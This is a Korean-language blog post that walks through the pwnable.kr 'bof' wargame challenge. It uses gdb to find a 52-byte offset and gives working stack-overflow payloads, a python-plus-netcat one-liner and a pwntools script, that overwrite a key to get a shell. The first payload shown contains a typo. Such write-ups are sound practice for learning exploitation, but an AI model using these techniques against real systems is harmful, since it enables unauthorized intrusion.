---
layout: post
title:  "3. markdown"
subtitle: ""
date:   2018-09-18 20:14:13 +0900
categories: security
tags : pwnable
---

![1]({{"/assets/img/security/pwnable/3/1.png" | absolute_url}})

문제 5번은 이름부터 bof이다.

설명에도 버퍼 오버플로우 취약점이 언급되는 것으로 봐서 버퍼 오버플로우 관련 문제인 것을 유추할 수 있다.

바이너리와 바이너리의 소스코드로 추정되는 링크가 주어지고 해당 파일을 분석하여

netcat을 이용해서 공격을 수행하는 것으로 보인다.

![2]({{"/assets/img/security/pwnable/3/2.png" | absolute_url}})

다운받은 bof.c 소스코드이다.

func 함수에 `0xdeadbeef`라는 값을 전달하고 func 내에서 overflowme라는 32바이트 문자열에 사용자로부터 입력을 받는다. 

파라미터로 전달받은 key의 값이 `0xcafebabe`와 일치할 경우 shell이 실행된다. 

overflowme 변수를 오버플로우시켜 매개변수로 전달받은 key의 값을 `0xcafebabe`로 변조에 성공하면 서버의 쉘이 실행된다.

먼저 gdb를 이용하여 bof의 스택 구조를 살펴본다.


![3]({{"/assets/img/security/pwnable/3/3.png" | absolute_url}})

bof 바이너리의 main 함수이다. 

해당 함수에서 esp 레지스터에 `0xdeadbeef` 값을 할당하는 명령어에 

break point를 걸고 실행을 시켜 `0xdeadbeef` 값의 위치를 추적한다.


![4]({{"/assets/img/security/pwnable/3/4.png" | absolute_url}})

![5]({{"/assets/img/security/pwnable/3/5.png" | absolute_url}})

esp 레지스터에 0xffffd3c0 주소가 들어있는 것을 확인할 수 있었으며 해당 위치에 0xdeadbeef 값이 할당된다.

![6]({{"/assets/img/security/pwnable/3/6.png" | absolute_url}})

확인 결과 위와 같이 실제 `0xffffd3c0` 주소에 `0xdeadbeef` 값이 들어간 것을 확인할 수 있었다.

이제 `func` 함수의 `gets` 함수를 이용하여 오버플로우 시켜 해당 메모리 영역을 `0xcafebabe`로 덮으면 된다.

먼저 `gets` 함수에 입력하는 값이 메모리 영역의 어디에 쓰이는지 확인하기 위해 `func` 함수를 살펴본다.

![7]({{"/assets/img/security/pwnable/3/7.png" | absolute_url}})

`gets` 이후 메모리 영역을 살펴봐야 하므로 `gets` 함수를 호출하는 다음 명령어에 bp를 걸고 실행한다. 

`gets` 함수가 실행되고 입력을 요구하여 임의의 `a`문자로만 구성된 문자열을 입력했다.

이후 `ebp` 레지스터에 8바이트 더한 메모리 영역의 값과 `0xcafebabe`와 비교하는 명령어가 있기 때문에 `ebp` 레지스터의 주소 주변을 출력했다.

![8]({{"/assets/img/security/pwnable/3/8.jpeg" | absolute_url}})

확인 결과 입력한 ‘a’로 구성된 문자열의 시작하는 주소가 `0xffffd38c`였으며 

입력하는 값은 해당 주소부터 리틀엔디안 방식으로 입력되는 것을 확인할 수 있었다.

 `0xdeadbeef` 까지 길이는 52바이트이므로 다음과 같은 페이로드를 작성할 수 있다.

{% highlight bash %}
`python -c ‘print “a”*52 + “\be\xba\xfe\xca”’`
{% endhighlight %}

해당 페이로드를 바이너리에 입력하면 오버플로우가되고 `/bin/sh`가 실행된다.

`netcat` 명령어를 이용하여 서버상의 바이너리를 페이로드를 입력하여 실행한다.

{% highlight bash %}
(python -c 'print "a"*52 + "\xbe\xba\xfe\xca"' ; cat) | nc pwnable.kr 9000
{% endhighlight %}


![9]({{"/assets/img/security/pwnable/3/9.png" | absolute_url}})

-------------------------------------------------------
### pwntools

{% highlight python %}
from pwn import *
 
c = remote("pwnable.kr", 9000)
 
payload = "A" * 52 + p32(0xcafebabe)
 
c.sendline(payload)
 
c.interactive()
{% endhighlight %}

![10]({{"/assets/img/security/pwnable/3/10.png" | absolute_url}})


